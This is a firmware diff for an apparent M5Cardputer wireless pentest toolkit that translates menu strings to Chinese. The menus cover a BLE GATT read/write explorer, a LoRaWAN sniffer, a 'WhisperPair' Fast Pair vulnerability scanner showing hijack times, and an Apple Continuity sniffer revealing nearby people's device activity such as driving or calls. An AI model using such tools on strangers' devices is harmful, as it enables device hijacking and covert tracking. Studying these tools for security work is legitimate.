           if (idx == sel) { sp.fillRect(0, y, W, lineH, TFT_NAVY); sp.setTextColor(TFT_GREEN, TFT_NAVY); }
@@ -40479,7 +40717,7 @@ void bleGattExplorerMenu() {
           sp.printf("%-20s %d", nm.c_str(), d.rssi);
         }
         sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841);
-        sp.setCursor(4, H - 12); sp.print(";/. ENT=connect R=rescan BACK");
+        sp.setCursor(4, H - 12); sp.print(";/. ENT=连接 R=重扫 BACK=退出");
         push(); draw = false;
       }
       M5.update(); cardUpdate();
@@ -40492,7 +40730,7 @@ void bleGattExplorerMenu() {
           keyRelease();
           GattDev dev = g_gatt_devs[sel];
           sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841);
-          sp.setTextColor(TFT_CYAN, 0x0841); sp.setCursor(2, 3); sp.print("Connecting...");
+          sp.setTextColor(TFT_CYAN, 0x0841); sp.setCursor(2, 3); sp.print("正在连接...");
           sp.setTextColor(TFT_WHITE, TFT_BLACK); sp.setCursor(6, 40); sp.print(dev.addr.toString().c_str());
           push();
           if (client->isConnected()) {   // clean any previous/stale link first
@@ -40504,7 +40742,7 @@ void bleGattExplorerMenu() {
           bool ok = client->connect(dev.addr, dev.type);
           Serial.printf("[GATT] connect ret=%d isConnected=%d heap=%u\n", (int)ok, (int)client->isConnected(), (unsigned)ESP.getFreeHeap());
           if (!ok) {
-            sp.setTextColor(TFT_RED, TFT_BLACK); sp.setCursor(6, 70); sp.print("Connect failed");
+            sp.setTextColor(TFT_RED, TFT_BLACK); sp.setCursor(6, 70); sp.print("连接失败");
             push(); delay(1200); draw = true; continue;
           }
           delay(200);   // let the link settle before service discovery
@@ -40532,8 +40770,8 @@ void bleGattExplorerMenu() {
           Serial.printf("[GATT] services=%d isConnected=%d heap=%u\n", (int)g_gatt_svcs.size(), (int)client->isConnected(), (unsigned)ESP.getFreeHeap());
           if (!client->isConnected()) {   // dropped during/after discovery
             sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841);
-            sp.setTextColor(TFT_CYAN, 0x0841); sp.setCursor(2, 3); sp.print("BLE GATT Explorer");
-            sp.setTextColor(TFT_ORANGE, TFT_BLACK); sp.setCursor(8, 56); sp.print("Device dropped the link");
+            sp.setTextColor(TFT_CYAN, 0x0841); sp.setCursor(2, 3); sp.print("BLE GATT 浏览器");
+            sp.setTextColor(TFT_ORANGE, TFT_BLACK); sp.setCursor(8, 56); sp.print("设备断开了连接");
             push(); delay(1300); draw = true; continue;
           }
           // ── SERVICES list ── open one -> lazily discover ITS characteristics
@@ -40544,8 +40782,8 @@ void bleGattExplorerMenu() {
               int lineH = 13, listY = 16, maxVis = (H - listY - 14) / lineH;
               if (ssel < stop2) stop2 = ssel; if (ssel >= stop2 + maxVis) stop2 = ssel - maxVis + 1;
               sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841);
-              sp.setTextColor(TFT_CYAN, 0x0841); sp.setCursor(2, 3); sp.printf("Services (%d)", (int)g_gatt_svcs.size());
-              if (g_gatt_svcs.empty()) { sp.setTextColor(0x8410, TFT_BLACK); sp.setCursor(8, 56); sp.print("no services"); }
+              sp.setTextColor(TFT_CYAN, 0x0841); sp.setCursor(2, 3); sp.printf("服务列表 (%d)", (int)g_gatt_svcs.size());
+              if (g_gatt_svcs.empty()) { sp.setTextColor(0x8410, TFT_BLACK); sp.setCursor(8, 56); sp.print("无服务"); }
               for (int i = 0; i < maxVis && (stop2 + i) < (int)g_gatt_svcs.size(); i++) {
                 int idx = stop2 + i, y = listY + i * lineH;
                 if (idx == ssel) { sp.fillRect(0, y, W, lineH, TFT_NAVY); sp.setTextColor(TFT_GREEN, TFT_NAVY); }
@@ -40556,7 +40794,7 @@ void bleGattExplorerMenu() {
                   else sp.printf("%s", gatt_short_uuid(g_gatt_svcs[idx].uuid).c_str()); }
               }
               sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841);
-              sp.setCursor(4, H - 12); sp.print(";/. ENT=open BACK=disc");
+              sp.setCursor(4, H - 12); sp.print(";/. ENT=打开 BACK=断开");
               push(); sdraw = false;
             }
             M5.update(); cardUpdate();
@@ -40571,7 +40809,7 @@ void bleGattExplorerMenu() {
                 BLERemoteService* s = g_gatt_svcs[ssel].s;
                 g_gatt_chars.clear(); bool partial = false;
                 sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841);
-                sp.setTextColor(TFT_CYAN, 0x0841); sp.setCursor(2, 3); sp.print("Reading service...");
+                sp.setTextColor(TFT_CYAN, 0x0841); sp.setCursor(2, 3); sp.print("正在读取服务...");
                 push();
                 Serial.printf("[GATT] open svc %s heap=%u conn=%d\n", g_gatt_svcs[ssel].uuid.c_str(), (unsigned)ESP.getFreeHeap(), (int)client->isConnected());
                 if (!client->isConnected() || ESP.getFreeHeap() < 14000) {
@@ -40604,8 +40842,8 @@ void bleGattExplorerMenu() {
                     if (csel < ctop) ctop = csel; if (csel >= ctop + maxVis) ctop = csel - maxVis + 1;
                     sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841);
                     sp.setTextColor(TFT_CYAN, 0x0841); sp.setCursor(2, 3);
-                    sp.printf("Chars (%d)%s", (int)g_gatt_chars.size(), partial ? " partial!" : "");
-              if (g_gatt_chars.empty()) { sp.setTextColor(0x8410, TFT_BLACK); sp.setCursor(8, 56); sp.print("no characteristics"); }
+                    sp.printf("特征值 (%d)%s", (int)g_gatt_chars.size(), partial ? " (部分!)" : "");
+              if (g_gatt_chars.empty()) { sp.setTextColor(0x8410, TFT_BLACK); sp.setCursor(8, 56); sp.print("无特征值"); }
               for (int i = 0; i < maxVis && (ctop + i) < (int)g_gatt_chars.size(); i++) {
                 int idx = ctop + i, y = listY + i * lineH; GattChar& g = g_gatt_chars[idx];
                 if (idx == csel) { sp.fillRect(0, y, W, lineH, TFT_NAVY); sp.setTextColor(TFT_GREEN, TFT_NAVY); }
@@ -40616,7 +40854,7 @@ void bleGattExplorerMenu() {
                   else sp.printf("%-11s [%s]", gatt_short_uuid(g.uuid).c_str(), g.props); }
               }
               sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841);
-              sp.setCursor(4, H - 12); sp.print(";/. ENT=open BACK=disc");
+              sp.setCursor(4, H - 12); sp.print(";/. ENT=打开 BACK=返回");
               push(); cdraw = false;
             }
             M5.update(); cardUpdate();
@@ -40632,18 +40870,18 @@ void bleGattExplorerMenu() {
                   if (!client->isConnected()) { cdraw = true; break; }   // link dropped -> back to char list (which also bails)
                   if (adraw || (g_gatt_notif && subscribed)) {
                     sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841);
-                    sp.setTextColor(TFT_CYAN, 0x0841); sp.setCursor(2, 3); sp.print("Characteristic");
+                    sp.setTextColor(TFT_CYAN, 0x0841); sp.setCursor(2, 3); sp.print("特征值详情");
                     sp.setTextColor(TFT_WHITE, TFT_BLACK);
-                    sp.setCursor(4, 18); sp.printf("svc %s %.16s", gatt_short_uuid(g.svc).c_str(), gatt_name(g.svc).c_str());
-                    sp.setCursor(4, 30); sp.printf("chr %s %.16s", gatt_short_uuid(g.uuid).c_str(), gatt_name(g.uuid).c_str());
-                    sp.setCursor(4, 42); sp.printf("handle 0x%04X [%s]", g.handle, g.props);
+                    sp.setCursor(4, 18); sp.printf("服务 %s %.16s", gatt_short_uuid(g.svc).c_str(), gatt_name(g.svc).c_str());
+                    sp.setCursor(4, 30); sp.printf("特征 %s %.16s", gatt_short_uuid(g.uuid).c_str(), gatt_name(g.uuid).c_str());
+                    sp.setCursor(4, 42); sp.printf("句柄 0x%04X [%s]", g.handle, g.props);
                     if (last.length()) { sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.setCursor(4, 58); sp.printf("%.34s", last.c_str()); }
                     if (subscribed) {
-                      sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(4, 74); sp.print("SUBSCRIBED");
+                      sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(4, 74); sp.print("已订阅通知");
                       if (g_gatt_notif) { sp.setTextColor(0x07FF, TFT_BLACK); sp.setCursor(4, 86); sp.printf("%.34s", g_gatt_notif_s); g_gatt_notif = false; }
                     }
                     sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841);
-                    sp.setCursor(4, H - 12); sp.print("R=read W=write N=notify BACK");
+                    sp.setCursor(4, H - 12); sp.print("R=读取 W=写入 N=通知 BACK=返回");
                     push(); adraw = false;
                   }
                   M5.update(); cardUpdate();
@@ -40665,8 +40903,8 @@ void bleGattExplorerMenu() {
                       int lo = hv(hx[i+1]); if (lo < 0) { i++; continue; }
                       buf[n++] = (hi << 4) | lo; i += 2;
                     }
-                    if (n > 0) { g.ch->writeValue(buf, n, true); last = String("WR ") + n + "B sent"; }
-                    else last = "WR: no hex";
+                    if (n > 0) { g.ch->writeValue(buf, n, true); last = String("已写入 ") + n + " 字节"; }
+                    else last = "写入失败: 无效HEX";
                     adraw = true;
                   }
                   if ((kp('n') || kp('N')) && g.ch->canNotify()) {
@@ -40714,7 +40952,7 @@ void lorawanSnifferMenu() {
   LwRawFrame* ring = (LwRawFrame*)malloc(sizeof(LwRawFrame) * CAP);
   if(!ring) {
     sp.fillScreen(TFT_BLACK); sp.setTextColor(TFT_RED, TFT_BLACK);
-    sp.setCursor(8, 60); sp.print("LoRaWAN: out of memory");
+    sp.setCursor(8, 60); sp.print("LoRaWAN: 内存不足");
     delay(1200); return;
   }
 
@@ -40727,10 +40965,10 @@ void lorawanSnifferMenu() {
 
   if(!lw_sniff_start(freq, sf, bw)) {
     sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841);
-    sp.setTextColor(TFT_CYAN, 0x0841); sp.setCursor(2, 3); sp.print("Cap LoRaWAN");
-    sp.setTextColor(TFT_RED, TFT_BLACK);    sp.setCursor(8, 48); sp.print("No SX1262 detected");
-    sp.setTextColor(0x8410, TFT_BLACK);     sp.setCursor(8, 66); sp.print("Attach the Cap LoRa-1262 HAT");
-    sp.setCursor(8, 82); sp.print("press any key");
+    sp.setTextColor(TFT_CYAN, 0x0841); sp.setCursor(2, 3); sp.print("Cap LoRaWAN 嗅探");
+    sp.setTextColor(TFT_RED, TFT_BLACK);    sp.setCursor(8, 48); sp.print("未检测到 SX1262 模块");
+    sp.setTextColor(0x8410, TFT_BLACK);     sp.setCursor(8, 66); sp.print("请安装 Cap LoRa-1262 扩展模块");
+    sp.setCursor(8, 82); sp.print("按任意键返回");
     while(true) { M5.update(); cardUpdate(); if(M5Cardputer.Keyboard.isPressed() || kp(KEY_BACKSPACE)) break; delay(10); }
     keyRelease(); free(ring); return;
   }
@@ -40751,7 +40989,7 @@ void lorawanSnifferMenu() {
   auto drawList = [&]() {
     sp.fillScreen(TFT_BLACK);
     sp.fillRect(0, 0, W, 14, 0x0841);
-    sp.setTextColor(TFT_CYAN, 0x0841); sp.setCursor(2, 3); sp.print("Cap LoRaWAN");
+    sp.setTextColor(TFT_CYAN, 0x0841); sp.setCursor(2, 3); sp.print("Cap LoRaWAN 嗅探");
     char hdr[20];
     snprintf(hdr, sizeof(hdr), "rx %lu", (unsigned long)rxTotal);
     sp.setTextColor(TFT_WHITE, 0x0841); sp.setCursor(W - 56, 3); sp.print(hdr);
@@ -40762,8 +41000,8 @@ void lorawanSnifferMenu() {
     sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.printf("%.1f", freq);
     sp.setTextColor(0x07FF, TFT_BLACK);     sp.printf(" SF%d", sf);
     sp.setTextColor(0xFD20, TFT_BLACK);     sp.printf(" B%d", (int)bw);
-    sp.setTextColor(scan ? TFT_GREEN : 0x8410, TFT_BLACK); sp.print(scan ? " SCAN" : " PARK");
-    sp.setTextColor(logging ? TFT_ORANGE : 0x8410, TFT_BLACK); sp.print(logging ? " LOG" : " ---");
+    sp.setTextColor(scan ? TFT_GREEN : 0x8410, TFT_BLACK); sp.print(scan ? " 跳频" : " 定频");
+    sp.setTextColor(logging ? TFT_ORANGE : 0x8410, TFT_BLACK); sp.print(logging ? " 记录" : " ---");
 
     int lineH = 13, listY = 28, maxVis = (H - listY - 14) / lineH;
     if(sel < 0) sel = 0;
@@ -40772,7 +41010,7 @@ void lorawanSnifferMenu() {
     if(sel < top) top = sel; if(sel >= top + maxVis) top = sel - maxVis + 1;
     if(stored == 0) {
       sp.setTextColor(0x8410, TFT_BLACK); sp.setCursor(8, listY + 16);
-      sp.print("listening...");
+      sp.print("正在监听...");
     }
     LwParsed pr;
     for(int i = 0; i < maxVis && (top + i) < stored; i++) {
@@ -40808,7 +41046,7 @@ void lorawanSnifferMenu() {
 
     sp.fillRect(0, H - 14, W, 14, 0x0841);
     sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(3, H - 12);
-    sp.print("F=ch ,//=fq S=sf B=bw H=scan L=log");
+    sp.print("F=信道 ,//=微调 S=扩频 B=带宽 H=跳频 L=日志");
   };
 
   // ── per-frame detail view ──
@@ -40818,7 +41056,7 @@ void lorawanSnifferMenu() {
     sp.fillScreen(TFT_BLACK);
     sp.fillRect(0, 0, W, 14, 0x0841);
     sp.setTextColor(TFT_CYAN, 0x0841); sp.setCursor(2, 3);
-    sp.print(pr.ok ? lw_mtype_str(pr.mtype) : "Unknown frame");
+    sp.print(pr.ok ? lw_mtype_str(pr.mtype) : "未知数据帧");
     int y = 17; const int lh = 12;
     auto row = [&](uint16_t col, const char* s) {
       sp.setTextColor(col, TFT_BLACK); sp.setCursor(4, y); sp.print(s); y += lh;
@@ -40827,7 +41065,7 @@ void lorawanSnifferMenu() {
     snprintf(b, sizeof(b), "%.1fMHz SF%d  %ddBm %ddB", f.freq, f.sf, f.rssi, f.snr);
     row(TFT_YELLOW, b);
     if(!pr.ok) {
-      snprintf(b, sizeof(b), "raw len %u (no decode)", f.len); row(0x8410, b);
+      snprintf(b, sizeof(b), "原始长度 %u (无法解码)", f.len); row(0x8410, b);
     } else if(pr.mtype == LW_MT_JOIN_REQ) {
       char e[20]; lw_eui_str(pr.joinEUI, e, sizeof(e));
       snprintf(b, sizeof(b), "JoinEUI %s", e); row(TFT_WHITE, b);
@@ -40835,12 +41073,12 @@ void lorawanSnifferMenu() {
       snprintf(b, sizeof(b), "DevEUI  %s", e); row(TFT_WHITE, b);
       snprintf(b, sizeof(b), "DevNonce %u  MIC %08lX", pr.devNonce, (unsigned long)pr.mic);
       row(0x07FF, b);
-      row(0x8410, "AppKey -> decrypt (Phase 2)");
+      row(0x8410, "需 AppKey 解密");
     } else if(pr.mtype == LW_MT_JOIN_ACC) {
-      row(TFT_ORANGE, "Encrypted with AppKey");
-      snprintf(b, sizeof(b), "ciphertext %u bytes", f.len - 1); row(TFT_WHITE, b);
+      row(TFT_ORANGE, "已使用 AppKey 加密");
+      snprintf(b, sizeof(b), "密文 %u 字节", f.len - 1); row(TFT_WHITE, b);
     } else {
-      snprintf(b, sizeof(b), "DevAddr %08lX  %s", (unsigned long)pr.devAddr, pr.uplink ? "UP" : "DOWN");
+      snprintf(b, sizeof(b), "DevAddr %08lX  %s", (unsigned long)pr.devAddr, pr.uplink ? "上行" : "下行");
       row(TFT_GREEN, b);
       snprintf(b, sizeof(b), "FCnt %u  FPort %s%d", pr.fcnt,
                pr.hasFPort ? "" : "-", pr.hasFPort ? pr.fport : 0);
@@ -40850,7 +41088,7 @@ void lorawanSnifferMenu() {
       row(0x07FF, b);
       snprintf(b, sizeof(b), "FRM %u B  MIC %08lX", pr.frmLen, (unsigned long)pr.mic);
       row(0xCE79, b);
-      if(pr.hasFPort && pr.fport == 0) row(TFT_ORANGE, "FPort0: MAC cmds (NwkSKey)");
+      if(pr.hasFPort && pr.fport == 0) row(TFT_ORANGE, "FPort0: MAC命令 (NwkSKey)");
     }
     // raw hex (wrap)
     sp.setTextColor(0x8410, TFT_BLACK);
@@ -40862,7 +41100,7 @@ void lorawanSnifferMenu() {
     }
     sp.fillRect(0, H - 14, W, 14, 0x0841);
     sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(3, H - 12);
-    sp.print("BACK / any key = list");
+    sp.print("BACK / 任意键 = 返回列表");
   };
 
   drawList();
@@ -40988,7 +41226,7 @@ void beaconScanMenu() {
   scan->clearResults();
   if (sprite) { sprite->deleteSprite(); delete sprite; }
   releaseBLE();
-  waitAndReturnToMenu("Beacon Scan stopped");
+  waitAndReturnToMenu("信标扫描已停止");
 }
 // =================== BLE Beacon Scanner end ==========================
 
@@ -41178,25 +41416,25 @@ void wp_draw_list(M5Canvas* sprite, bool use_sprite, int sel, int top) {
   // header bar
   sp.fillRect(0, 0, W, 16, WP_BAR);
   sp.drawFastHLine(0, 16, W, violet);
-  sp.setTextFont(1);
-  sp.setTextSize(1.5);
+  evilKeepCnFont(sp);
+  evilSetCnFont(sp, 1.5);
   sp.setTextColor(violet, WP_BAR);
   sp.setCursor(6, 2); sp.print("WhisperPair");
-  sp.setTextSize(1);
+  evilSetCnFont(sp, 1);
   sp.setTextColor(TFT_WHITE, WP_BAR);
-  sp.setCursor(150, 4); sp.printf("targets:%d", cnt);
+  sp.setCursor(150, 4); sp.printf("目标:%d", cnt);
 
   if (cnt == 0) {
     sp.setTextColor(0x7BEF, TFT_BLACK);
-    sp.setCursor(10, 54); sp.print("Sniffing Fast Pair (0xFE2C)");
+    sp.setCursor(10, 54); sp.print("正在嗅探 Fast Pair (0xFE2C)");
     sp.setTextColor(0x5AEB, TFT_BLACK);
-    sp.setCursor(10, 68); sp.print("Bring a target BT device near");
+    sp.setCursor(10, 68); sp.print("请将目标蓝牙设备靠近");
   }
 
   const int lineH = 13;
   const int listY = 20;
   const int maxVis = (H - listY - 14) / lineH;   // 7 rows
-  sp.setTextSize(1);
+  evilSetCnFont(sp, 1);
   for (int i = top; i < top + maxVis && i < cnt; i++) {
     WpResult r;
     portENTER_CRITICAL(&wp_mux); r = wp_results[i]; portEXIT_CRITICAL(&wp_mux);
@@ -41206,12 +41444,12 @@ void wp_draw_list(M5Canvas* sprite, bool use_sprite, int sel, int top) {
     uint16_t col; const char* tag; const char* label;
     if (k) {
       col = k->affected ? TFT_RED : TFT_GREEN;
-      tag = k->affected ? "VULN" : "SAFE";
+      tag = k->affected ? "漏洞" : "安全";
       label = k->name;
     } else if (r.hasModelId) {
-      col = TFT_YELLOW; tag = " ?  "; label = "Fast Pair (untested)";
+      col = TFT_YELLOW; tag = " ?  "; label = "Fast Pair (未测试)";
     } else {
-      col = 0x7BEF; tag = "hid "; label = "Fast Pair (hidden)";
+      col = 0x7BEF; tag = "隐藏"; label = "Fast Pair (隐藏)";
     }
 
     int y = listY + (i - top) * lineH;
@@ -41238,10 +41476,10 @@ void wp_draw_list(M5Canvas* sprite, bool use_sprite, int sel, int top) {
   // footer bar
   sp.fillRect(0, H - 13, W, 13, WP_BAR);
   sp.setTextColor(TFT_GREEN, WP_BAR);
-  sp.setCursor(4, H - 11); sp.print("ENTER read");
+  sp.setCursor(4, H - 11); sp.print("ENTER 详情");
   sp.setTextColor(0x5AEB, WP_BAR);
-  sp.setCursor(92, H - 11);  sp.print("i:info");
-  sp.setCursor(150, H - 11); sp.print(";/. BACK");
+  sp.setCursor(92, H - 11);  sp.print("i:详情");
+  sp.setCursor(150, H - 11); sp.print(";/. BACK=退出");
 
   if (use_sprite) sprite->pushSprite(0, 0);
 }
@@ -41262,20 +41500,20 @@ void wp_show_detail(M5Canvas* sprite, bool use_sprite, int sel) {
   sp.fillScreen(TFT_BLACK);
   sp.fillRect(0, 0, W, 16, WP_BAR);
   sp.drawFastHLine(0, 16, W, violet);
-  sp.setTextFont(1);
-  sp.setTextSize(1.5);
+  evilKeepCnFont(sp);
+  evilSetCnFont(sp, 1.5);
   sp.setTextColor(violet, WP_BAR);
-  sp.setCursor(6, 2); sp.print("Target Detail");
+  sp.setCursor(6, 2); sp.print("目标详情");
 
-  sp.setTextSize(1);
+  evilSetCnFont(sp, 1);
   int y = 22;
   sp.setTextColor(TFT_WHITE, TFT_BLACK);
   sp.setCursor(6, y); sp.printf("MAC  %02X:%02X:%02X:%02X:%02X:%02X",
     r.mac[0], r.mac[1], r.mac[2], r.mac[3], r.mac[4], r.mac[5]); y += 12;
-  sp.setCursor(6, y); sp.printf("RSSI %d dBm", r.rssi); y += 12;
+  sp.setCursor(6, y); sp.printf("信号 %d dBm", r.rssi); y += 12;
   sp.setCursor(6, y);
-  if (r.hasModelId) sp.printf("Model %lu", (unsigned long)r.modelId);
-  else              sp.print("Model hidden  (ENTER = read)");
+  if (r.hasModelId) sp.printf("型号ID %lu", (unsigned long)r.modelId);
+  else              sp.print("型号已隐藏 (非可发现模式)");
   y += 14;
 
   if (k) {
@@ -41286,31 +41524,31 @@ void wp_show_detail(M5Canvas* sprite, bool use_sprite, int sel) {
     uint16_t sc = k->affected ? TFT_RED : TFT_GREEN;
     sp.fillRect(4, y, W - 8, 15, sc);
     sp.setTextColor(TFT_BLACK, sc);
-    sp.setTextSize(1.5);
+    evilSetCnFont(sp, 1.5);
     sp.setCursor(10, y + 2);
-    sp.print(k->affected ? "VULNERABLE - WhisperPair" : "NOT VULNERABLE");
-    sp.setTextSize(1);
+    sp.print(k->affected ? "存在漏洞 - WhisperPair" : "安全 (无漏洞)");
+    evilSetCnFont(sp, 1);
     y += 19;
 
-    const char* nn = (k->nonce == WP_N_YES)     ? "yes"
-                   : (k->nonce == WP_N_SESSION) ? "session" : "no";
+    const char* nn = (k->nonce == WP_N_YES)     ? "是"
+                   : (k->nonce == WP_N_SESSION) ? "会话级" : "否";
     sp.setTextColor(0xCE79, TFT_BLACK);
-    sp.setCursor(6, y); sp.printf("Nonce reuse: %s", nn); y += 11;
-    sp.setCursor(6, y); sp.printf("Paper hijack time: %s", k->hijack); y += 11;
+    sp.setCursor(6, y); sp.printf("Nonce 重用: %s", nn); y += 11;
+    sp.setCursor(6, y); sp.printf("劫持耗时(论文): %s", k->hijack); y += 11;
   } else if (r.hasModelId) {
     sp.setTextColor(TFT_YELLOW, TFT_BLACK);
-    sp.setCursor(6, y); sp.print("Fast Pair device (untested)"); y += 12;
+    sp.setCursor(6, y); sp.print("Fast Pair 设备 (未在测试库中)"); y += 12;
   } else {
     sp.setTextColor(0x7BEF, TFT_BLACK);
-    sp.setCursor(6, y); sp.print("Not in discoverable mode"); y += 12;
+    sp.setCursor(6, y); sp.print("设备未处于配对广播模式"); y += 12;
   }
 
   // footer
   sp.fillRect(0, H - 13, W, 13, WP_BAR);
   sp.setTextColor(0x5AEB, WP_BAR);
-  sp.setCursor(4, H - 11); sp.print("BR/EDR replay N/A on S3");
+  sp.setCursor(4, H - 11); sp.print("S3 不支持 BR/EDR 经典蓝牙重放");
   sp.setTextColor(TFT_GREEN, WP_BAR);
-  sp.setCursor(168, H - 11); sp.print("BACK");
+  sp.setCursor(168, H - 11); sp.print("BACK=返回");
 
   if (use_sprite) sprite->pushSprite(0, 0);
 
@@ -41401,7 +41639,7 @@ void whisperPairMenu() {
   scan->clearResults();
   if (sprite) { sprite->deleteSprite(); delete sprite; }
   releaseBLE();
-  waitAndReturnToMenu("WhisperPair stopped");
+  waitAndReturnToMenu("WhisperPair 已停止");
 }
 
 // =====================================================================
@@ -41576,35 +41814,35 @@ int ac_batt_pct(uint8_t nib) {           // -1 = unknown
 
 const char* ac_activity(uint8_t a) {
   switch (a) {
-    case 0x01: return "reporting off";
-    case 0x03: return "locked/idle";
-    case 0x05: return "audio (locked)";
-    case 0x07: return "active";
-    case 0x09: return "video";
-    case 0x0A: return "watch unlocked";
-    case 0x0B: return "in use";
-    case 0x0D: return "driving";
-    case 0x0E: return "call";
-    default:   return "unknown";
+    case 0x01: return "关闭报告";
+    case 0x03: return "锁屏/空闲";
+    case 0x05: return "音频(锁屏)";
+    case 0x07: return "活跃";
+    case 0x09: return "视频播放";
+    case 0x0A: return "手表已解锁";
+    case 0x0B: return "使用中";
+    case 0x0D: return "驾驶模式";
+    case 0x0E: return "通话中";
+    default:   return "未知";
   }
 }
 
 const char* ac_devtype(bool hasPods, uint16_t podModel, bool hasHotspot,
                        bool hasAirplay, uint8_t dataFlags, bool hasNearby) {
   if (hasPods) { int m = ac_model_idx(podModel); return (m >= 0) ? AC_MODELS[m].name : "AirPods (?)"; }
-  if (hasHotspot)        return "iPhone (hotspot)";
+  if (hasHotspot)        return "iPhone (热点)";
   if (hasAirplay)        return "AirPlay / TV";
   if (dataFlags & 0x20)  return "Apple Watch";
   if (hasNearby)         return "iPhone/iPad/Mac";
-  return "Apple device";
+  return "Apple 设备";
 }
 
 // ---- type filters (cycled with left/right) ----
 #define AC_FILTERS 7
 const char* ac_filter_name(int f) {
   static const char* n[AC_FILTERS] =
-    { "All", "AirPods", "iPhone/iPad/Mac", "Watch", "Hotspot", "AirPlay", "Named" };
-  return (f >= 0 && f < AC_FILTERS) ? n[f] : "All";
+    { "全部", "AirPods", "iPhone/iPad/Mac", "Watch", "个人热点", "AirPlay", "有名称" };
+  return (f >= 0 && f < AC_FILTERS) ? n[f] : "全部";
 }
 
 bool ac_match(int filter, bool hasPods, bool hasNearby, bool hasHotspot,
@@ -41649,8 +41887,8 @@ void ac_draw_list(M5Canvas* sprite, bool use_sprite, int filter,
   sp.fillScreen(TFT_BLACK);
   sp.fillRect(0, 0, W, 16, AC_BAR);
   sp.drawFastHLine(0, 16, W, violet);
-  sp.setTextFont(1);
-  sp.setTextSize(1);
+  evilKeepCnFont(sp);
+  evilSetCnFont(sp, 1);
   sp.setTextColor(violet, AC_BAR);
   sp.setCursor(4, 3); sp.print("Apple");
   sp.setTextColor(TFT_YELLOW, AC_BAR);
@@ -41661,15 +41899,15 @@ void ac_draw_list(M5Canvas* sprite, bool use_sprite, int filter,
   if (fcount == 0) {
     sp.setTextColor(0x7BEF, TFT_BLACK);
     sp.setCursor(10, 54);
-    sp.print(total == 0 ? "Sniffing Continuity (0x004C)" : "No device for this filter");
+    sp.print(total == 0 ? "正在嗅探 Continuity (0x004C)" : "当前筛选无设备");
     sp.setTextColor(0x5AEB, TFT_BLACK);
-    sp.setCursor(10, 68); sp.print(",/. change filter");
+    sp.setCursor(10, 68); sp.print(",/. 切换筛选");
   }
 
   const int lineH = 13;
   const int listY = 20;
   const int maxVis = (H - listY - 14) / lineH;   // 7
-  sp.setTextSize(1);
+  evilSetCnFont(sp, 1);
   for (int i = top; i < top + maxVis && i < fcount; i++) {
     AcDev d;
     portENTER_CRITICAL(&ac_mux); d = ac_devs[fidx[i]]; portEXIT_CRITICAL(&ac_mux);
@@ -41691,7 +41929,7 @@ void ac_draw_list(M5Canvas* sprite, bool use_sprite, int filter,
       snprintf(info, sizeof(info), "L%d R%d C%d",
                l < 0 ? 0 : l, r < 0 ? 0 : r, c < 0 ? 0 : c);
     } else if (d.hasHotspot) {
-      snprintf(info, sizeof(info), "batt %d%% %db", d.hsBatt, d.hsBars);
+      snprintf(info, sizeof(info), "电%d%% %d格", d.hsBatt, d.hsBars);
     } else if (d.hasNearby) {
       snprintf(info, sizeof(info), "%s", ac_activity(d.action));
     } else {
@@ -41722,11 +41960,11 @@ void ac_draw_list(M5Canvas* sprite, bool use_sprite, int filter,
 
   sp.fillRect(0, H - 13, W, 13, AC_BAR);
   sp.setTextColor(TFT_GREEN, AC_BAR);
-  sp.setCursor(4, H - 11); sp.print("ENTER info");
+  sp.setCursor(4, H - 11); sp.print("ENTER 详情");
   sp.setTextColor(TFT_YELLOW, AC_BAR);
-  sp.setCursor(84, H - 11); sp.print(",/. filter");
+  sp.setCursor(84, H - 11); sp.print(",/. 筛选");
   sp.setTextColor(0x5AEB, AC_BAR);
-  sp.setCursor(168, H - 11); sp.print(";/. BACK");
+  sp.setCursor(168, H - 11); sp.print(";/. BACK=退");
 
   if (use_sprite) sprite->pushSprite(0, 0);
 }
@@ -41771,14 +42009,14 @@ void ac_draw_detail(M5Canvas* sprite, bool use_sprite, int devIndex, int pos, in
   sp.fillScreen(TFT_BLACK);
   sp.fillRect(0, 0, W, 16, AC_BAR);
   sp.drawFastHLine(0, 16, W, violet);
-  sp.setTextFont(1);
-  sp.setTextSize(1.5);
+  evilKeepCnFont(sp);
+  evilSetCnFont(sp, 1.5);
   sp.setTextColor(violet, AC_BAR);
   sp.setCursor(6, 2);
   sp.print(d.name[0] ? d.name
            : ac_devtype(d.hasPods, d.podModel, d.hasHotspot, d.hasAirplay, d.dataFlags, d.hasNearby));
 
-  sp.setTextSize(1);
+  evilSetCnFont(sp, 1);
   sp.setTextColor(TFT_WHITE, AC_BAR);
   sp.setCursor(202, 4); sp.printf("%d/%d", pos + 1, fcount);
 
@@ -41786,7 +42024,7 @@ void ac_draw_detail(M5Canvas* sprite, bool use_sprite, int devIndex, int pos, in
   if (d.name[0]) {
     sp.setTextColor(0x5AEB, TFT_BLACK);
     sp.setCursor(4, y);
-    sp.printf("type: %s", ac_devtype(d.hasPods, d.podModel, d.hasHotspot, d.hasAirplay, d.dataFlags, d.hasNearby));
+    sp.printf("类型: %s", ac_devtype(d.hasPods, d.podModel, d.hasHotspot, d.hasAirplay, d.dataFlags, d.hasNearby));
     y += 11;
   }
   sp.setTextColor(0xCE79, TFT_BLACK);
@@ -41799,22 +42037,22 @@ void ac_draw_detail(M5Canvas* sprite, bool use_sprite, int devIndex, int pos, in
     ac_batt_bar(sp, 4,  y, "R", ac_batt_pct(d.battR), d.chgR); y += 11;
     ac_batt_bar(sp, 4,  y, "C", ac_batt_pct(d.battC), d.chgC); y += 11;
     sp.setTextColor(0x5AEB, TFT_BLACK);
